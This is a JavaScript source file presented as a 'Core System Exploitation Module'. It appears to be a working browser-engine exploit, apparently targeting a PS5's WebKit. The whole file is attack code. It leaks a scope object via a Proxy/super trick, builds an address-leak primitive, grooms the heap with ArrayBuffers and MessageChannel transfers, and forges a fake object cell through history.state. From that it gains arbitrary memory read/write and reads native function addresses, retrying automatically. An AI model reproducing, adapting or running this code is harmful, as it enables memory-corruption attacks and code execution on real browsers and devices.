/* HIGH TECH PS - Core System Exploitation Module */
let DRAIN_COUNT = 512;
const AUTO_RETRY_DELAY_MS = 50;

const K = 2;
const DUPLICATE_INDEX = 2;
const CONTROL_INDEX = 0xffff;
const CONTROL_INT = -64000;
const FILLER_BIGINTS = K - 1;
const FILLER_OBJECTS = 0xfffe - K;
const EXPECTED_LENGTH = 0x50001;
const CELL_BYTES = 0x30;
const FUNCTION_BYTES = 0x20;
const NATIVE_EXECUTABLE_BYTES = 0x38;
const HOLDER_BYTES = 0x40;

const CARRIER_SLOTS = (function () {
    try {
        const q = new URLSearchParams(location.search).get("slots");
        const n = q ? parseInt(q, 10) : 0;
        if (n >= 100000 && n <= 40000000) return n;
    } catch (e) { }
    return 12000000;
})();
const CARRIER_BYTES = CARRIER_SLOTS * 8;
const CAPTURE_DELAY_MS = 50;
const COMPOSE_DELAY_MS = 100;

const symbolToString = Symbol.prototype.toString;

const _gOverride = (function () {
    const out = {};
    try {
        const q = new URLSearchParams(location.search).getAll("g");
        for (const item of q) {
            const [k, v] = item.split(":");
            const n = v && v.startsWith("0x") ? parseInt(v, 16) : parseInt(v, 10);
            if (k && n > 0) out[k] = n;
        }
    } catch (e) { }
    return out;
})();
const _g = (name, dflt) => (typeof _gOverride[name] === "number" ? _gOverride[name] : dflt);
if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;

const DRAIN_SIZE = _g("drainsz", 0x10000);
const SLAB_SIZE = _g("slab", 0x400000);
const BUTTERFLY_HOLE_SIZE = _g("bfly", 0x81000);
const SEPARATOR_SIZE = _g("sep", 0x10000);
const EARLY_HOLE_SIZE = _g("early", 0x70000);
const GUARD_SIZE = _g("guard", 0x90000);
const PREDECESSOR_SIZE = _g("pred", 0x80000);
const FINAL_HOLE_SIZE = _g("final", 0x80000);

const RW_BUFFER_SIZE = 0x100;
const IDENT_OFFSET = 0x20;

const LEAK_SLOT_INDEX = 2;
const LEAK_SLOT_OFFSET = 0x10 + 8 * LEAK_SLOT_INDEX;

const REVISION = "HIGH-TECH-PS-core-1";
const attemptKey = `${REVISION}:attempts`;
const burstKey = `${REVISION}:burst`;

const rwHeader = new Uint8Array(CELL_BYTES);
const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
const holderHeader = new Uint8Array(HOLDER_BYTES);
const scratchBits = new ArrayBuffer(8);
const scratchBytes = new Uint8Array(scratchBits);
const scratchWords = new Uint32Array(scratchBits);
const scratchDouble = new Float64Array(scratchBits);

const identityMagic = new Uint8Array([0x5a, 0xa5, 0xc3, 0x3c, 0xde, 0xad, 0xbe, 0xef]);
const identityBytes = new Uint8Array(8);

let attemptNumber = 0;
let attemptCeiling = 0;
let keepIndex = 0;
let stopped = false;
let keepAlive = null;
let onEvent = null;
let criticalBarrier = null;
let settleResolve = null;
let settleReject = null;
let running = false;

let referenceTarget = null;
let rwBuffer = null;
let rwView = null;
let rwMirror = null;
let targetBuffer = null;
let targetView = null;
const nativeTarget = parseInt;
let fakeHost = null;
let lengthWord = null;
let anchorElement = null;
let markerObjectA = null;
let markerObjectB = null;
let targetHolder = null;
let holderGuardA = null;
let holderGuardB = null;
let fillerGraph = null;
let outerGraph = null;

let leakedScope = null;
let getterCarrier = null;
let preparedSymbolObject = null;
let capturedString = null;
let capturedWords = null;
let copiedLength = 0;
let captureState = 0;
let captureError = null;
let hostAddress = NaN;
let fakeAddress = NaN;

let predecessorWords = null;
let pointerLow = 0;
let pointerHigh = 0;
let targetAddress = NaN;
let targetAddressLow = 0;
let targetAddressHigh = 0;
let nativeTargetAddress = NaN;
let anchorElementAddress = NaN;
let markerAAddress = NaN;
let markerBAddress = NaN;

let rwOriginalVector = NaN;
let rwHeaderOK = false;
let holderHeaderOK = false;
let functionHeaderOK = false;
let nativeExecutableHeaderOK = false;
let functionStructureID = 0;
let nativeExecutableStructureID = 0;
let executableAddress = NaN;
let nativeFunctionAddress = NaN;
let nativeConstructorAddress = NaN;
let pointersRepeated = false;
let restoreObserved = false;
let retrySafe = false;
let retryScheduled = false;
let attemptPersisted = false;
let candidateEverReturned = false;
let candidateMutationStarted = false;
let zeroHeaderMiss = false;
let identityResult = 0;

let compositionState = 0;
let compositionLength = 0;
let compositionError = null;

let liveCandidate = null;
let fakeReleased = false;

const UNSEEN = -1;
const profile = {
    carrierSID: UNSEEN, carrierType: UNSEEN, carrierFlags: UNSEEN,
    carrierMode: UNSEEN, carrierByte28: UNSEEN,
    holderSID: UNSEEN, holderType: UNSEEN, holderFlags: UNSEEN,
    functionSID: UNSEEN, functionType: UNSEEN, functionFlags: UNSEEN,
    nativeExecSID: UNSEEN, nativeExecType: UNSEEN, nativeExecFlags: UNSEEN,
    cellSize: UNSEEN,
    vectorOffset: 0x10, inlineSlotOffset: 0x10, butterflyOffset: 0x08,
    vectorOffsetMeasured: false
};

function resetProfile() {
    profile.carrierSID = UNSEEN; profile.carrierType = UNSEEN;
    profile.carrierFlags = UNSEEN; profile.carrierMode = UNSEEN;
    profile.carrierByte28 = UNSEEN;
    profile.holderSID = UNSEEN; profile.holderType = UNSEEN;
    profile.holderFlags = UNSEEN;
    profile.functionSID = UNSEEN; profile.functionType = UNSEEN;
    profile.functionFlags = UNSEEN;
    profile.nativeExecSID = UNSEEN; profile.nativeExecType = UNSEEN;
    profile.nativeExecFlags = UNSEEN;
}

function hex(value) { return `0x${value.toString(16)}`; }
function buffer(size) { return new ArrayBuffer(size); }

function allZero(bytes, start, end) {
    for (let i = start; i < end; ++i) {
        if (bytes[i] !== 0) return false;
    }
    return true;
}

function uint32At(bytes, offset) {
    return bytes[offset] + bytes[offset + 1] * 0x100 + bytes[offset + 2] * 0x10000 + bytes[offset + 3] * 0x1000000;
}

function low48At(bytes, offset) {
    return bytes[offset] + bytes[offset + 1] * 0x100 + bytes[offset + 2] * 0x10000 + bytes[offset + 3] * 0x1000000 + bytes[offset + 4] * 0x100000000 + bytes[offset + 5] * 0x10000000000;
}

function readBytes(destination, source, count) {
    for (let i = 0; i < count; ++i) destination[i] = source[i];
}

function sameBytes(left, right, count) {
    for (let i = 0; i < count; ++i) {
        if (left[i] !== right[i]) return false;
    }
    return true;
}

function readTwiceMatches(destination, source, count) {
    readBytes(destination, source, count);
    return sameBytes(destination, source, count);
}

function aimCarrier(candidate, address) {
    const high = Math.floor(address / 0x100000000);
    scratchWords[0] = address - high * 0x100000000;
    scratchWords[1] = high;
    for (let i = 0; i < 8; ++i) candidate[0x10 + i] = scratchBytes[i];
}

function restoreCarrier(candidate) {
    for (let i = 0; i < 8; ++i) candidate[0x10 + i] = rwHeader[0x10 + i];
}

function pointerFromWords(words, offset) {
    if (words[offset + 3] !== 0) return NaN;
    return words[offset] + words[offset + 1] * 0x10000 + words[offset + 2] * 0x100000000;
}

function plausibleCell(value) {
    return value > 0x100000000 && value <= 0xffffffffffff && value <= 9007199254740991 && Math.floor(value) === value && value % 8 === 0;
}

function plausibleAddress(value) {
    return value > 0x100000000 && value <= 0xffffffffffff && value <= 9007199254740991 && Math.floor(value) === value;
}

function canonicalLow48(bytes, offset) {
    return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
}

function dumpHex(bytes, count) {
    let out = "";
    for (let i = 0; i < count; ++i) out += bytes[i].toString(16).padStart(2, "0");
    return out;
}

function encodedHeaderNumber() {
    const raw = new ArrayBuffer(8);
    const u32 = new Uint32Array(raw);
    const f64 = new Float64Array(raw);
    u32[0] = 0x00004250;
    u32[1] = 0x01062800;
    return f64[0];
}

function emit(tag, detail) {
    if (onEvent === null) return;
    try { onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber); } catch { }
}

function checkCarrierIdentity(candidate) {
    if (!plausibleAddress(rwOriginalVector) || rwOriginalVector % 8 !== 0 || IDENT_OFFSET + 8 > RW_BUFFER_SIZE) return 0;
    aimCarrier(candidate, rwOriginalVector + IDENT_OFFSET);
    readBytes(identityBytes, rwView, 8);
    restoreCarrier(candidate);
    return sameBytes(identityBytes, identityMagic, 8) && rwView[0] === 0x3c ? 1 : -1;
}

function runIdentityProof(candidate) {
    candidateMutationStarted = true;
    identityResult = checkCarrierIdentity(candidate);
    return identityResult === 1;
}

function ceilingReached() {
    return attemptCeiling > 0 && attemptNumber >= attemptCeiling;
}

function giveUp(reason) {
    stopped = true;
    emit("HIGH-TECH-PS-GIVE-UP", `reason=${reason}-attempts=${attemptNumber}`);
    const reject = settleReject;
    settleResolve = null;
    settleReject = null;
    running = false;
    if (reject !== null) reject(new Error(`HIGH TECH PS: gave up after ${attemptNumber} attempts (${reason})`));
}

function failed() {
    if (ceilingReached()) { giveUp("attempt-ceiling"); return; }
    emit("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
    stopped = false;
    retryScheduled = false;
    setTimeout(() => {
        try { history.replaceState(null, ""); } catch { }
        attemptNumber++;
        startAttempt();
    }, AUTO_RETRY_DELAY_MS);
}

function releaseAttemptAllocations() {
    referenceTarget = null; rwBuffer = null; rwView = null; rwMirror = null;
    targetBuffer = null; targetView = null; fakeHost = null; lengthWord = null;
    anchorElement = null; markerObjectA = null; markerObjectB = null; targetHolder = null;
    holderGuardA = null; holderGuardB = null; fillerGraph = null; outerGraph = null;
    leakedScope = null; getterCarrier = null; preparedSymbolObject = null;
    capturedString = null; capturedWords = null; predecessorWords = null; keepAlive = null;
    try { history.replaceState(null, ""); } catch { }
    if (typeof globalThis.gc === "function") { try { globalThis.gc(); } catch { } }
}

function scheduleSafeRetry(reason) {
    if (retryScheduled || stopped) return;
    const candidateStateSafe = !candidateEverReturned || (zeroHeaderMiss && !candidateMutationStarted);
    if (!retrySafe || !candidateStateSafe || candidateMutationStarted || !attemptPersisted) {
        failed();
        return;
    }
    if (ceilingReached()) { giveUp("attempt-ceiling"); return; }
    retryScheduled = true;
    const nextAttempt = attemptNumber + 1;
    releaseAttemptAllocations();
    setTimeout(() => {
        const candidateStillSafe = !candidateEverReturned || (zeroHeaderMiss && !candidateMutationStarted);
        if (!retrySafe || !candidateStillSafe || candidateMutationStarted || stopped) {
            failed();
            return;
        }
        attemptNumber = nextAttempt;
        startAttempt();
    }, Math.max(AUTO_RETRY_DELAY_MS, 750));
}

function finishEarlySafeAttempt(tag, extra, reason) {
    retrySafe = true;
    emit(tag, `${extra}-retry-safe=true`);
    scheduleSafeRetry(reason);
}

function resetAttemptState() {
    referenceTarget = null; rwBuffer = null; rwView = null; rwMirror = null;
    targetBuffer = null; targetView = null; fakeHost = null; lengthWord = null;
    anchorElement = null; markerObjectA = null; markerObjectB = null; targetHolder = null;
    holderGuardA = null; holderGuardB = null; fillerGraph = null; outerGraph = null;
    leakedScope = null; getterCarrier = null; preparedSymbolObject = null;
    capturedString = null; capturedWords = null; copiedLength = 0; captureState = 0; captureError = null;
    hostAddress = NaN; fakeAddress = NaN; predecessorWords = null;
    keepAlive = new Array(DRAIN_COUNT + 3); keepIndex = 0; pointerLow = 0; pointerHigh = 0;
    targetAddress = NaN; targetAddressLow = 0; targetAddressHigh = 0; nativeTargetAddress = NaN;
    anchorElementAddress = NaN; markerAAddress = NaN; markerBAddress = NaN;
    rwOriginalVector = NaN; rwHeaderOK = false; holderHeaderOK = false; functionHeaderOK = false;
    nativeExecutableHeaderOK = false; functionStructureID = 0; nativeExecutableStructureID = 0;
    executableAddress = NaN; nativeFunctionAddress = NaN; nativeConstructorAddress = NaN;
    pointersRepeated = false; restoreObserved = false; retrySafe = false; retryScheduled = false;
    candidateEverReturned = false; candidateMutationStarted = false; zeroHeaderMiss = false;
    identityResult = 0; identityBytes.fill(0); compositionState = 0; compositionLength = 0;
    compositionError = null; liveCandidate = null; resetProfile();
    rwHeader.fill(0); targetHeader.fill(0); holderHeader.fill(0);
}

function startAttempt() {
    if (fakeReleased || stopped) return;
    resetAttemptState();
    try {
        sessionStorage.setItem(attemptKey, String(attemptNumber));
        attemptPersisted = sessionStorage.getItem(attemptKey) === String(attemptNumber);
    } catch { }
    emit("ATTEMPT-START", `HIGH-TECH-PS-attempt=${attemptNumber}`);
    try {
        buildAndStoreGraph();
        for (let i = 0; i < 8; ++i) rwView[IDENT_OFFSET + i] = identityMagic[i];
        prepareAddrof();
    } catch (error) {
        finishEarlySafeAttempt("SETUP-THREW", `${error?.name}:${String(error?.message).slice(0, 80)}`, "setup-threw");
    }
}

function leakScopeObject() {
    class Leaker { leak() { return super.foo; } }
    Leaker.prototype.__proto__ = new Proxy({}, { get: function (target, property, receiver) { return receiver; } });
    const leak = Leaker.prototype.leak;
    return (function () { return leak(); })();
}

function prepareSymbolWrapper(F) {
    leakedScope = leakScopeObject();
    if (leakedScope === undefined || leakedScope === null) throw new Error("scope-not-leaked");
    for (let i = 0; i < 512; i++) leakedScope[`p${i}`] = i;
    for (let j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;
    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
    return Object(leakedScope.g);
}

function buildFakeHost() {
    rwBuffer = new ArrayBuffer(RW_BUFFER_SIZE);
    rwView = new Uint8Array(rwBuffer);
    rwMirror = new Uint8Array(rwBuffer);
    rwMirror[0] = 0x3c;
    targetBuffer = new ArrayBuffer(0x20);
    targetView = new Uint8Array(targetBuffer);
    targetView[0] = 0xa5;
    lengthWord = { keep: 0x51515151 };

    fakeHost = { q0: encodedHeaderNumber(), q1: 1.1, q2: rwView, q3: lengthWord, q4: 2.2, q5: 3.3 };
    delete fakeHost.q1; delete fakeHost.q4; delete fakeHost.q5;

    if (!Number.isFinite(fakeHost.q0) || fakeHost.q2 !== rwView || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c || targetView[0] !== 0xa5 || typeof nativeTarget !== "function")
        throw new Error("fake-host-shape-failed");

    anchorElement = document.createElement("textarea");
    markerObjectA = { marker: 0x4d41524b, kind: "probe-marker-a" };
    markerObjectB = { marker: 0x4d41524c, kind: "probe-marker-b" };
    holderGuardA = { marker: 0x484f4c44 };
    holderGuardB = { marker: 0x47554152 };
    targetHolder = { q0: nativeTarget, q1: anchorElement, q2: markerObjectA, q3: markerObjectB, q4: holderGuardA, q5: holderGuardB };
}

function buildAndStoreGraph() {
    referenceTarget = { marker: 0x51515151, kind: "HIGH-TECH-PS-reference" };
    buildFakeHost();
    fillerGraph = new Array(0xfffd);
    let pos = 0;
    const huge = 1n << 40n;
    for (let b = 0; b < FILLER_BIGINTS; ++b) fillerGraph[pos++] = huge + BigInt(b);
    for (let o = 0; o < FILLER_OBJECTS; ++o) fillerGraph[pos++] = {};

    outerGraph = new Array(CONTROL_INDEX + 1);
    outerGraph[0] = fillerGraph;
    outerGraph[1] = referenceTarget;
    outerGraph[2] = referenceTarget;
    outerGraph[CONTROL_INDEX] = CONTROL_INT;
    history.replaceState(outerGraph, "");
}

function prepareAddrof() {
    capturedWords = new Uint16Array(16);
    getterCarrier = function getterCarrierFunction() { return 7; };
    getterCarrier[0] = fakeHost;
    for (let i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
    getterCarrier[1] = targetHolder;
    getterCarrier[2] = fakeHost;
    getterCarrier[3] = targetHolder;

    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
    setTimeout(beginComposition, COMPOSE_DELAY_MS);
}

function runAddrofCapture() {
    try {
        capturedString = symbolToString.call(preparedSymbolObject);
        copiedLength = capturedString.length;
        for (let i = 0; i < 16; i++) capturedWords[i] = capturedString.charCodeAt(7 + i);
        captureState = 1;
    } catch (error) {
        captureError = error;
        captureState = -1;
    }
}

function fillRawCellPointers(backing, pointer) {
    pointerHigh = Math.floor(pointer / 0x100000000);
    pointerLow = pointer - pointerHigh * 0x100000000;
    predecessorWords = new Uint32Array(backing);
    for (let i = 0; i < predecessorWords.length; i += 2) {
        predecessorWords[i] = pointerLow;
        predecessorWords[i + 1] = pointerHigh;
    }
}

function clearPredecessor() {
    if (predecessorWords !== null) predecessorWords.fill(0);
}

function loadHistoryCritical() {
    let result = null;
    let candidate = null;
    let rwHeaderCaptured = false;
    let rwVectorTouched = false;
    try {
        result = history.state;
        compositionLength = result.length;

        if (compositionLength !== EXPECTED_LENGTH || result[1] === result[DUPLICATE_INDEX]) {
            result[DUPLICATE_INDEX] = undefined;
            clearPredecessor();
            retrySafe = true;
            compositionState = 2;
            return;
        }

        candidate = result[DUPLICATE_INDEX];
        candidateEverReturned = true;
        result[DUPLICATE_INDEX] = undefined;
        result = null;

        readBytes(rwHeader, candidate, CELL_BYTES);
        rwHeaderCaptured = true;

        const rwSID = uint32At(rwHeader, 0);
        const rwButterfly = low48At(rwHeader, 8);
        const rwLength = uint32At(rwHeader, 0x18);
        rwOriginalVector = low48At(rwHeader, 0x10);

        rwHeaderOK = rwSID >= 0x100 && rwSID < 0x08000000 && rwLength === RW_BUFFER_SIZE;
        if (!rwHeaderOK) {
            zeroHeaderMiss = allZero(rwHeader, 0, CELL_BYTES);
            retrySafe = zeroHeaderMiss;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        rwVectorTouched = true;
        if (!runIdentityProof(candidate)) {
            clearPredecessor();
            compositionState = 3;
            return;
        }

        for (let i = 0; i < 8; ++i) scratchBytes[i] = rwHeader[i];
        if (scratchBytes[6] >= 2) scratchBytes[6] -= 2;
        else {
            scratchBytes[6] = (scratchBytes[6] + 0x100 - 2) & 0xff;
            scratchBytes[7] = (scratchBytes[7] - 1) & 0xff;
        }
        fakeHost.q0 = scratchDouble[0];

        aimCarrier(candidate, targetAddress);
        readTwiceMatches(holderHeader, rwView, HOLDER_BYTES);
        nativeTargetAddress = low48At(holderHeader, 0x10);
        anchorElementAddress = low48At(holderHeader, 0x18);
        markerAAddress = low48At(holderHeader, 0x20);
        markerBAddress = low48At(holderHeader, 0x28);

        aimCarrier(candidate, nativeTargetAddress);
        readBytes(targetHeader, rwView, FUNCTION_BYTES);
        executableAddress = low48At(targetHeader, 0x18);

        aimCarrier(candidate, executableAddress);
        readBytes(targetHeader, rwView, NATIVE_EXECUTABLE_BYTES);
        nativeFunctionAddress = low48At(targetHeader, 0x28);
        nativeConstructorAddress = low48At(targetHeader, 0x30);

        try { globalThis.__ps5NativeCtor = nativeConstructorAddress; } catch (e) { }

        restoreCarrier(candidate);
        rwVectorTouched = false;
        targetView[0] = 0xa5;
        rwMirror[0] = 0x3c;
        restoreObserved = rwView[0] === 0x3c && rwMirror[0] === 0x3c && targetView[0] === 0xa5;

        liveCandidate = candidate;
        clearPredecessor();
        compositionState = 1;
    } catch (error) {
        retrySafe = true;
        compositionError = error;
        compositionState = -1;
    }
}

function runGroomAndLoad() {
    try {
        const channel = new MessageChannel();
        channel.port1.close();
        channel.port2.close();

        for (let i = 0; i < DRAIN_COUNT; ++i) keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
        let slab = buffer(SLAB_SIZE);
        channel.port1.postMessage(0, [slab]);
        slab = null;

        const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
        const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
        const separator = buffer(SEPARATOR_SIZE);
        const earlyHole = buffer(EARLY_HOLE_SIZE);
        const guard = buffer(GUARD_SIZE);
        const predecessor = buffer(PREDECESSOR_SIZE);
        const finalHole = buffer(FINAL_HOLE_SIZE);

        fillRawCellPointers(predecessor, fakeAddress);
        keepAlive[keepIndex++] = separator;
        keepAlive[keepIndex++] = guard;
        keepAlive[keepIndex++] = predecessor;

        criticalBarrier(fakeAddress, targetAddress);
        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
        loadHistoryCritical();
    } catch (error) {
        clearPredecessor();
        retrySafe = true;
        compositionError = error;
        compositionState = -1;
    }
    reportComposition();
}

let barrierNode = null;

function ensureBarrierNode() {
    if (barrierNode !== null) return;
    try {
        barrierNode = document.createElement("div");
        barrierNode.style.cssText = "position:absolute;left:-9999px;top:0";
        document.body.appendChild(barrierNode);
    } catch { barrierNode = null; }
}

function defaultCriticalBarrier(fake, target) {
    try {
        const line = `HIGH-TECH-PS-CRITICAL-fake=${hex(fake)}-target=${hex(target)}`;
        if (barrierNode !== null) {
            barrierNode.textContent = line;
            void barrierNode.offsetWidth;
        }
        sessionStorage.setItem(burstKey, line);
    } catch { }
}

function beginComposition() {
    if (captureState <= 0) {
        finishEarlySafeAttempt("ADDROF-FAIL", "capture-failed", "addrof-fail");
        return;
    }

    const a0 = pointerFromWords(capturedWords, 0);
    const b0 = pointerFromWords(capturedWords, 4);

    hostAddress = a0;
    targetAddress = b0;
    fakeAddress = hostAddress + 0x10;

    runGroomAndLoad();
}

function reportComposition() {
    if (compositionState === 1 && liveCandidate !== null) {
        stopped = true;
        running = false;
        const resolve = settleResolve;
        settleResolve = null;
        settleReject = null;
        if (resolve !== null) resolve(buildCarrier());
    } else {
        failed();
    }
}

function buildCarrier() {
    profile.cellSize = 0x20;
    return {
        aim(address) {
            if (liveCandidate === null) throw new Error("carrier is no longer live");
            aimCarrier(liveCandidate, address);
        },
        restore() {
            if (liveCandidate === null) throw new Error("carrier is no longer live");
            restoreCarrier(liveCandidate);
        },
        get view() { return rwView; },
        windowBytes: RW_BUFFER_SIZE,
        holder: targetHolder,
        holderAddress: targetAddress,
        leakSlotOffset: LEAK_SLOT_OFFSET,
        leakSlotAddress: targetAddress + LEAK_SLOT_OFFSET,
        setLeakSlot(value) { targetHolder.q2 = value; },
        clearLeakSlot() { targetHolder.q2 = markerObjectA; },
        anchorObject: markerObjectA,
        anchorObjectAddress: markerAAddress,
        textarea: anchorElement,
        textareaAddress: anchorElementAddress,
        profile,
        attempts: attemptNumber,
        validate: plausibleAddress,
        hostAddress,
        fakeAddress,
        assertHome() {
            return rwView && rwView[0] === 0x3c && targetView && targetView[0] === 0xa5;
        }
    };
}

export function establishPrimitive(options) {
    const opts = options || {};
    if (fakeReleased) return Promise.reject(new Error("HIGH TECH PS: core cell released"));
    if (running) return Promise.reject(new Error("HIGH TECH PS: core running"));

    onEvent = typeof opts.onEvent === "function" ? opts.onEvent : null;
    criticalBarrier = typeof opts.beforeCriticalLoad === "function" ? opts.beforeCriticalLoad : defaultCriticalBarrier;

    if (criticalBarrier === defaultCriticalBarrier) ensureBarrierNode();
    attemptCeiling = typeof opts.maxAttempts === "number" && opts.maxAttempts > 0 ? opts.maxAttempts : 0;

    running = true;
    stopped = false;
    attemptNumber = 1;

    return new Promise((resolve, reject) => {
        settleResolve = resolve;
        settleReject = reject;
        startAttempt();
    });
}

export function currentCarrier() {
    return liveCandidate === null ? null : buildCarrier();
}

export function releaseFakeCell() {
    fakeReleased = true;
    stopped = true;
    running = false;
    return { released: ["HIGH-TECH-PS-CORE-RELEASED"], fakeReleased: true };
}

export function fakeCellReleased() { return fakeReleased; }
export function carrierHeaderCopy() { return rwHeader.slice(0, CELL_BYTES); }
export function carrierHomeVector() { return rwOriginalVector; }

export { profile, aimCarrier, restoreCarrier, plausibleAddress, plausibleCell };
